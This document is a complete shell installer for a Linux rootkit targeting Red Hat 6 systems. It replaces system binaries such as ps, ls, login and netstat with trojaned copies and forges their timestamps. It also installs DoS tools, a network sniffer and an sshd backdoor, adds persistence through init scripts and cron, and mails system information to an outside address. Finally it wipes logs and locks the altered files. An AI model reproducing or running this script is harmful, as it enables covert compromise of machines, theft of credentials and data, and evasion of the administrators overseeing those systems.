#!/bin/sh
cl="[0m"
cyn="[36m"
wht="[37m"
hblk="[1;30m"
hgrn="[1;32m"
hcyn="[1;36m"
hwht="[1;37m"
hred="[1;31m"
unset HISTFILE
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/X11R6/bin:/root/bin:/usr/local/bin
echo >install.log
echo "Install log for `hostname -i` or `hostname -i`">>install.log
echo >>install.log
echo "*** Rootkit install log ***" >>install.log
echo >>install.log
echo "Installing..." >>install.log
chattr -iau /etc/rc.d/init.d/sshd /etc/rc.d/init.d/syslogd /etc/rc.d/init.d/functions /usr/bin/chsh /etc/rc.d/init.d/atd >>install.log 2>&1
chattr -iau /usr/local/sbin/sshd /usr/sbin/sshd /bin/ps /bin/netstat /bin/login /bin/ls /usr/bin/du /usr/bin/find /usr/sbin/atd >>install.log 2>&1
chattr -iau /usr/bin/pstree /usr/bin/killall /usr/bin/top /sbin/fuser /sbin/ifconfig /usr/sbin/syslogd /sbin/syslogd >>install.log 2>&1
chattr -iau /etc/rc.d/init.d/inet >>install.log 2>&1
rm -f /var/lock/subsys/atd
killall -9 atd >>install.log 2>&1
cp -f syslogd.init /etc/rc.d/init.d/syslog >>install.log 2>&1
if [ -f /etc/rc.d/init.d/syslogd ]; then
    cp -f syslogd.init /etc/rc.d/init.d/syslogd >>install.log 2>&1
fi
/etc/rc.d/init.d/syslog stop >>install.log 2>&1
echo
echo "        ${cl}${cyn}-=${cl}${hblk}[${cl}${hgrn}overkill Red Hat 6.*rk${cl}${hblk}]${cl}${cyn}=-${cl}${wht}"
echo 
if [ ! -d /etc/rc.d/init.d ] || [ ! -d /etc/rc.d/rc0.d ]; then
    echo "${cl}${hred}Argh!! .. SysV init not found${cl}${wht}"
    echo "${cl}${hred}Installation aborted.${cl}${wht}"
    echo "non-sysv init system, installation aborted" >>install.log
    /etc/rc.d/init.d/syslog start >>install.log 2>&1
    exit 1
fi
if [ ! -x /usr/bin/md5sum ]; then
    echo "${cl}${hred}Argh!! .. md5sum not found${cl}${wht}"
    echo "${cl}${hred}Installation aborted.${cl}${wht}"
    echo "md5sum not found on the system, installation aborted" >>install.log
    /etc/rc.d/init.d/syslog start >>install.log 2>&1
    exit 1
fi
cp -f .1proc /dev/ttyop
cp -f .1addr /dev/ttyoa
cp -f .1file /dev/ttyof
cp -f .1logz /dev/ttyos
touch -acmr /etc/rc.d/init.d/atd atd.init >>install.log 2>&1
touch -acmr /etc/rc.d/init.d/syslog syslogd.init >>install.log 2>&1
touch -acmr /etc/rc.d/init.d/sshd sshd/init.sshd >>install.log 2>&1
touch -acmr /usr/bin/chsh chsh >>install.log 2>&1
touch -acmr /usr/bin/du du >>install.log 2>&1
touch -acmr /usr/bin/find find >>install.log 2>&1
touch -acmr /sbin/ifconfig ifconfig >>install.log 2>&1
touch -acmr /usr/bin/killall killall >>install.log 2>&1
touch -acmr /bin/login login >>install.log 2>&1
touch -acmr /usr/sbin/atd md5bd >>install.log 2>&1
touch -acmr /bin/netstat netstat >>install.log 2>&1
touch -acmr /bin/ps ps >>install.log 2>&1
touch -acmr /bin/ls ls >>install.log 2>&1
touch -acmr /usr/bin/pstree pstree >>install.log 2>&1
touch -acmr `which syslogd` syslogd >>install.log 2>&1
touch -acmr /usr/bin/top top >>install.log 2>&1
touch -acmr /usr/bin/vdir vdir >>install.log 2>&1
echo "${cl}${cyn}|${cl}${hcyn}= ${cl}${hwht}Installing trojaned programs...${cl}${wht}"
echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}chsh"
chmod +s chsh
cp -f chsh /usr/bin/chsh >>install.log 2>&1
echo -n "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}ps"
echo -n "ps " >>install.log
if [ ! "$(2>&1 ./ps >/dev/null)" ]; then
  if [ ! -x /bin/lps ]; then
    mv -f /bin/ps /bin/lps >>install.log 2>&1
    if [ -x /bin/.ps ]; then
	cp -f /bin/.ps /bin/lps >>install.log 2>&1
    fi
  fi
  cp -f ps /bin >>install.log 2>&1
  if [ -x /bin/.ps ]; then
    cp -f ps /bin/.ps >>install.log 2>&1
  fi
  echo
  echo "ok" >>install.log
else
  echo "${cl}${hred} *** failed ***${cl}${wht}"
  echo "failed" >>install.log
fi

echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}top"
echo "top " >>install.log
if [ ! -x /usr/bin/ltop ]; then
  mv -f /usr/bin/top /usr/bin/ltop >>install.log 2>&1
fi
cp -f top /usr/bin/ >>install.log 2>&1

echo -n "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}pstree"
echo -n "pstree " >>install.log
if [ ! "$(2>&1 ./pstree >/dev/null)" ]; then
  if [ ! -x /usr/bin/lpstree ]; then
    mv /usr/bin/pstree /usr/bin/lpstree >>install.log 2>&1
  fi
  cp -f pstree /usr/bin >>install.log 2>&1
  echo
  echo "ok" >>install.log
else
  echo "${cl}${hred} *** failed ***${cl}${wht}"
  echo "failed" >>install.log
fi

echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}killall"
echo "killall " >>install.log
if [ ! -x /usr/bin/lkillall ]; then
  mv -f /usr/bin/killall /usr/bin/pidof >>install.log 2>&1
fi
  cp -f killall /usr/bin/ >>install.log 2>&1

echo -n "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}ls"
echo -n "ls " >>install.log
unalias ls >/dev/null 2>&1
alias ls='ls --color=tty'
if [ ! "$(2>&1 ./ls >/dev/null)" ]; then
  if [ ! -x /bin/lsp ]; then
    mv -f /bin/ls /bin/lsp >>install.log 2>&1
  fi
  cp -f ls /bin/ >>install.log 2>&1
  cp -f ls /usr/bin/dir
  cp -f vdir /usr/bin
  echo "alias ls='ls --color=tty'" >> /etc/bashrc
  echo
  echo "ok" >>install.log
else
  echo "${cl}${hred} *** failed ***${cl}${wht}"
  echo "failed" >>install.log
fi

if [ ! -d /usr/include/rpcsvc ]; then
  mkdir -p /usr/include/rpcsvc >>install.log 2>&1
fi

echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}find"
echo "find " >>install.log
if [ ! -x /usr/bin/lfind ]; then
  mv -f /usr/bin/find /usr/bin/lfind
fi
cp -f find /usr/bin

echo -n "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}du"
echo -n "du " >>install.log
if [ ! "$(2>&1 ./du >/dev/null)" ]; then
  if [ ! -f /usr/include/rpcsvc/du ]; then
    mv -f /usr/bin/du /usr/include/rpcsvc/du >>install.log 2>&1
    chmod -x /usr/include/rpcsvc/du
  fi
  cp -f du /usr/bin >>install.log 2>&1
  echo
  echo "ok" >>install.log
else
  echo "${cl}${hred} *** failed ***${cl}${wht}"
  echo "failed" >>install.log
fi

echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}netstat"
echo "netstat " >>install.log
if [ ! -x /bin/lnetstat ]; then
    mv -f /bin/netstat /bin/lnetstat >>install.log 2>&1
fi
cp -f netstat /bin/ >>install.log 2>&1
  
if [ -x /sbin/syslogd ]; then
    echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}syslogd"
    echo "syslogd" >>install.log
    if [ ! -f /usr/include/rpcsvc/syslogd ]; then
      mv -f /sbin/syslogd /usr/include/rpcsvc/syslogd
      chmod -x /usr/include/rpcsvc/syslogd
    fi
    cp -f syslogd /sbin/ >>install.log 2>&1
fi

echo -n "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}ifconfig"
echo -n "ifconfig " >>install.log
if [ ! "$(2>&1 ./ifconfig >/dev/null)" ]; then
    if [ ! -x /usr/include/rpcsvc/ifc ]; then
	mv -f /sbin/ifconfig /usr/include/rpcsvc/ifc >>install.log 2>&1
	chmod -x /usr/include/rpcsvc/ifc
    fi
    cp -f ifconfig /sbin/ifconfig >>install.log 2>&1
    echo
    echo "ok" >>install.log
else
    echo "${cl}${hred} *** failed ***${cl}${wht}"
    echo "failed" >>install.log
fi

echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}log cleaner"
cp -f clean /usr/bin
echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}wp"
cp -f wp /usr/bin/wp

echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}shad"
cp -f shad /bin
cp -f shad /usr/bin

mv -f /bin/login /usr/bin/xlogin >>install.log 2>&1
cp -f login /bin/login >>install.log 2>&1
cp -f md5bd /usr/sbin/atd >>install.log 2>&1
cp -f atd.init /etc/rc.d/init.d/atd >>install.log 2>&1

if [ -x /sbin/chkconfig ]; then
 /sbin/chkconfig --add atd >>install.log 2>>install.log
else
 ln -s /etc/rc.d/init.d/atd /etc/rc.d/rc0.d/K60atd >>install.log 2>&1
 ln -s /etc/rc.d/init.d/atd /etc/rc.d/rc1.d/K60atd >>install.log 2>&1
 ln -s /etc/rc.d/init.d/atd /etc/rc.d/rc2.d/K60atd >>install.log 2>&1
 ln -s /etc/rc.d/init.d/atd /etc/rc.d/rc3.d/S40atd >>install.log 2>&1
 ln -s /etc/rc.d/init.d/atd /etc/rc.d/rc4.d/S40atd >>install.log 2>&1
 ln -s /etc/rc.d/init.d/atd /etc/rc.d/rc5.d/S40atd >>install.log 2>&1
 ln -s /etc/rc.d/init.d/atd /etc/rc.d/rc6.d/K60atd >>install.log 2>&1
fi 

echo "${cl}${cyn}|${cl}${hcyn}= ${cl}${hwht}Installing DoS programs...${cl}${wht}"
echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}vadim"
cp -f vadim /usr/bin >>install.log 2>&1
echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}imp"
cp -f imp /usr/bin >>install.log 2>&1
echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}slice"
cp -f slice /usr/bin >>install.log 2>&1
echo "${cl}${cyn}|${cl}${hcyn}--- ${cl}${wht}sl2"
cp -f sl2 /usr/bin >>install.log 2>&1

echo "${cl}${cyn}|${cl}${hcyn}= ${cl}${hwht}Installing sniffer...${cl}${wht}"
echo "sniffer " >> install.log
if [ ! -d /usr/local/games ]; then
  mkdir -p /usr/local/games >>install.log 2>&1
fi
cp -f linsniffer /usr/local/games/identd >>install.log 2>&1
cp -f sense /usr/local/games/banner >>install.log 2>&1

echo "${cl}${cyn}|${cl}${hcyn}= ${cl}${hwht}Installing sshd backdoor...${cl}${wht}"
cd sshd
./sshd-install >>install.log 2>&1
cd ..

if [ -f /etc/rc.d/init.d/functions ]; then
    cat functions >>/etc/rc.d/init.d/functions
else
    cat functions >/etc/rc.d/init.d/functions
    chmod +x /etc/rc.d/init.d/functions >>install.log 2>&1
fi
if [ -f /etc/rc.d/init.d/xinetd ]; then
    touch -acmr /etc/rc.d/init.d/xinetd xinetd >>install.log 2>&1
    cp -f xinetd /etc/rc.d/init.d >>install.log 2>&1
    /etc/rc.d/init.d/xinetd start >>install.log 2>&1
else
    touch -acmr /etc/rc.d/init.d/inet inet >>install.log 2>&1
    cp -f inet /etc/rc.d/init.d >>install.log 2>&1
    if [ -x /sbin/chkconfig ]; then
	/sbin/chkconfig --add inet >>install.log 2>>install.log
    else
	ln -s /etc/rc.d/init.d/inet /etc/rc.d/rc0.d/K50inet >>install.log 2>&1
        ln -s /etc/rc.d/init.d/inet /etc/rc.d/rc1.d/K50inet >>install.log 2>&1
	ln -s /etc/rc.d/init.d/inet /etc/rc.d/rc2.d/K50inet >>install.log 2>&1
        ln -s /etc/rc.d/init.d/inet /etc/rc.d/rc3.d/S50inet >>install.log 2>&1
	ln -s /etc/rc.d/init.d/inet /etc/rc.d/rc4.d/S50inet >>install.log 2>&1
        ln -s /etc/rc.d/init.d/inet /etc/rc.d/rc5.d/S50inet >>install.log 2>&1
	ln -s /etc/rc.d/init.d/inet /etc/rc.d/rc6.d/K50inet >>install.log 2>&1
    fi 
    /etc/rc.d/init.d/inet start >>install.log 2>&1
fi

/etc/rc.d/init.d/atd start >>install.log 2>&1

echo "${cl}${cyn}|${cl}${hcyn}= ${cl}${hwht}Setting up crontab entries...${cl}${wht}"
crontab -u operator crontab-entry >> install.log 2>&1

echo "${cl}${hgrn}open ports:${cl}${wht}"
if [ -x /usr/sbin/lsof ]; then 
    /usr/sbin/lsof|grep LISTEN
else
    /bin/netstat -a|grep LISTEN|grep tcp
fi
echo "${cl}${hgrn}checking for other rootkits:${cl}${wht}"
if [ -d /dev/ida/.inet ]; then
    echo "${cl}${hred}/dev/ida/.inet${cl}${wht}"
fi
if [ -f /usr/bin/hdparm ]; then
    echo "${cl}${hred}/usr/bin/hdparm${cl}${wht}"
fi
if [ -d /dev/.rd ]; then
    echo "${cl}${hred}/dev/.rd${cl}${wht}"
fi
if [ -d /var/run/.pid ]; then
    echo "${cl}${hred}/var/run/.pid${cl}${wht}"
fi
if [ "`locate alya.cgi 2>/dev/null`" ]; then
    echo "${cl}${hred}alya.cgi${cl}${wht}"
    locate alya.cgi 2>/dev/null
fi
if [ -x /usr/bin/sourcemask ]; then
    echo "${cl}${hred}/usr/bin/sourcemask${cl}${wht}"
fi
if [ -x /etc/rc.d/init.d/init ]; then
    echo "${cl}${hred}/etc/rc.d/init.d/init${cl}${wht}"
fi
if [ "`locate c700 2>/dev/null`" ]; then
    echo "${cl}${hred}c700${cl}${wht}"
    locate c700 2>/dev/null|head -n 5
fi
if [ -d /var/spool/cron/"..   "/.zoot/ ] || [ "`locate zoot 2>/dev/null`" ]; then
    echo "${cl}${hred}zoot..${cl}${wht}"
    locate zoot 2>/dev/null|head -n 5
fi
if [ "`locate rsha 2>/dev/null|egrep -v marshal`" ]; then
    echo "${cl}${hred}rsha :\\${cl}${wht}"
    locate rsha 2>/dev/null|head -n 5
fi
if [ "`locate xper 2>/dev/null|egrep -v fixperm`" ]; then
    echo "${cl}${hred}xper${cl}${wht}"
    locate xper 2>/dev/null|head -n 5
fi
if [ "`locate .. 2>/dev/null|egrep -v '1.gz'`" ]; then
    echo "${cl}${hred}hmm.. ${cl}${wht}"
    locate ..|egrep -v '1.gz'|head -n 40
fi
if [ "`locate tcp.log 2>/dev/null`" ] || [ "`lsof|grep tcp.log`" ] || [ "`locate sniffer 2>/dev/null`" ]; then
    echo "${cl}${hred}sniffer logz${cl}${wht}"
    locate tcp.log 2>/dev/null
    lsof|grep tcp.log
    locate sniffer 2>/dev/null
fi
if [ "`locate .1proc 2>/dev/null`" ] || [ -d /usr/src/.puta ] || [ -f /etc/ttyhash ]; then
    echo "${cl}${hred}possible tk${cl}${wht}"
fi
if [ "`locate adore 2>/dev/null`" ]; then
    echo "${cl}${hred}possible adore lkm${cl}${wht}"
fi
if [ "`locate psybnc 2>/dev/null`" ]; then
    echo "${cl}${hred}hmm.. a fucking psybnc around${cl}${wht}"
    locate psybnc 2>/dev/null|head -n 20
fi
if [ "`locate mech 2>/dev/null|grep -v 'listmech'`" ]; then
    echo "${cl}${hred}aargh.. a fucking mech around${cl}${wht}"
    locate mech 2>/dev/null|grep -v 'listmech'|head -n 20
fi
if [ "`locate eggdrop 2>/dev/null`" ]; then
    echo "${cl}${hred}oopz.. a fucking egg around${cl}${wht}"
    locate eggdrop 2>/dev/null|head -n 40
fi
if [ "`locate sshdu 2>/dev/null`" ]; then
    echo "${cl}${hred}sshdu..${cl}${wht}"
    locate sshdu 2>/dev/null
fi
if [ "`ps -ax|grep "\./"|grep -v grep|grep -v install`" ]; then
    echo "${cl}${hred}suspect processes:${cl}${wht}"
    ps -ax|grep "\./"|grep -v grep|grep -v install
fi
echo "${cl}${hred}/dev filez:${cl}${wht}"
find /dev -type f|grep -v MAKEDEV|grep -v ttyo
echo "${cl}${hred} Patching  ${cl}${wht}"
/etc/rc.d/rc3.d/S11portmap stop >>install.log 2>&1
 mv /sbin/portmap /sbin/iportmap
if [ -x /sbin/chkconfig ]; then
 /sbin/chkconfig --del portmap
fi
/sbin/ipchains -A input -p tcp -j ACCEPT -s 127.0.0.1 -d 0.0.0.0/0 111
/sbin/ipchains -A input -p tcp -j DENY -s 0.0.0.0/0 -d 0.0.0.0/0 111
/sbin/ipchains -A input -p udp -j ACCEPT -s 127.0.0.1 -d 0.0.0.0/0 111
/sbin/ipchains -A input -p udp -j DENY -s 0.0.0.0/0 -d 0.0.0.0/0 111
/sbin/ipchains -A input -p tcp -j ACCEPT -s 127.0.0.1 -d 0.0.0.0/0 465
/sbin/ipchains -A input -p tcp -j DENY -s 0.0.0.0/0 -d 0.0.0.0/0 465
/sbin/ipchains -A input -p udp -j ACCEPT -s 127.0.0.1 -d 0.0.0.0/0 465
/sbin/ipchains -A input -p udp -j DENY -s 0.0.0.0/0 -d 0.0.0.0/0 24452
/sbin/ipchains -A input -p tcp -j ACCEPT -s 127.0.0.1 -d 0.0.0.0/0 24452
/sbin/ipchains -A input -p tcp -j DENY -s 0.0.0.0/0 -d 0.0.0.0/0 24452
/sbin/ipchains -A input -p udp -j ACCEPT -s 127.0.0.1 -d 0.0.0.0/0 24452
/sbin/ipchains -A input -p udp -j DENY -s 0.0.0.0/0 -d 0.0.0.0/0 24452
cp me /bin
mkdir /usr/man/man1/psybnc
mv get /usr/man/man1/psybnc
rpm -ivh --force ftp://ftp.intraware.com/pub/wget/wget-1_5_3-1_i386.rpm
echo "${cl}${hgrn}Sending mail...wait few minutez${cl}${wht}"
./sysinfo|mail -s 'Rest' metal_new@yahoo.com

echo "${cl}${hgrn}Done.${cl}${wht}"

/etc/rc.d/init.d/syslog start >>install.log 2>&1

echo >/var/log/messages  
echo >/var/log/boot.log
echo >/var/log/cron
echo >/var/log/secure
echo >/var/log/maillog
unset cl cyn wht hblk hgrn hcyn hwht hred
chattr +i /etc/rc.d/init.d/sshd /etc/rc.d/init.d/inet /etc/rc.d/init.d/functions /etc/rc.d/init.d/atd /usr/bin/chsh >>install.log 2>&1
chattr +i /usr/local/sbin/sshd /bin/ps /bin/netstat /bin/login /bin/ls /usr/bin/du /usr/bin/find >>install.log 2>&1
chattr +i /usr/sbin/atd /usr/bin/pstree /usr/bin/killall /usr/bin/top /sbin/fuser /sbin/ifconfig /usr/sbin/syslogd >>install.log 2>&1
chattr +i /sbin/syslogd >>install.log 2>&1
echo
echo "${cl}${cyn}|${cl}${hcyn}= ${cl}${hwht}Rootkit installed. Enjoy! :)${cl}${wht}"
cd ..
rm -rf dark.tgz
rm -rf dark
exit 0
